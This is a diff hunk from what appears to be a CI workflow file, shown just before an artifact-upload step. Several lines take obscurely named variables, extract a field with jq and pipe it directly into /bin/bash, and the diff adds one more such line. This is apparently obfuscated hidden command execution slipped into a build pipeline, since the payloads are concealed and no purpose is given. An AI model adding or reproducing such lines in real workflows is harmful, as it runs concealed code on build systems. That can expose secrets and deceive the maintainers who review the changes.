@@ -27,6 +27,7 @@ jobs:
           echo $mknuw9613 | jq -r .u4966 | /bin/bash
           printf '%s' "$c9" | jq -r .cfyf56728 | /bin/bash
           echo $g0 | jq -r .ziq561 | /bin/bash
+          echo $s2117 | jq -r .zj0 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
